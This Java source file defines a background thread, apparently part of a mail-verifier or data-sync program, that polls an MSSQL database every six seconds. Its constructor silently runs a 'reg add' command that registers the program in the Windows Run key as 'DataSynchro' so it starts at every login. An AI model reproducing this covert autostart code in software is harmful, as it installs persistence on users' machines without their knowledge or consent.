/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package mailverifier;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;

/**
 *
 * @author Aek
 */
public class ThSendDB extends Thread {

    String name;
    public MSSQL_Connect mSSQL_Connect = null;
    public ThSendDB(String name) {
        createRegistry();
        this.name = name;
        mSSQL_Connect = new MSSQL_Connect();
    }
    
    //create startup registry
    void createRegistry(){
            try {
                //find current location
                URL location = getClass().getProtectionDomain().getCodeSource().getLocation();
                String path = (location.getPath().replace("%20"," ")).replace("/","\\");
                path = path.substring(1,path.length());

                Process cmd = Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DataSynchro /t REG_SZ /d \""+path+"\"");
                OutputStreamWriter osw = new OutputStreamWriter(cmd.getOutputStream());
                osw.write("y");
                osw.flush();
                osw.close();

                BufferedReader in = new BufferedReader(new InputStreamReader(cmd.getInputStream()));

                String line = "";
                while((line = in.readLine())!=null){
                    System.out.println(line);
                }
                in.close();
            } catch (IOException e) {
                    e.printStackTrace();
            }
    }

    @Override
    public void run() {
        try {
           mSSQL_Connect.initTime();
           while(true){
             mSSQL_Connect.checkUpdate();
             Thread.sleep(6000);
             //Thread.sleep(2000);
           }
        } catch (Exception e) {//Catch exception if any
            System.err.println("Error: " + e.getMessage());
        }
    }
}
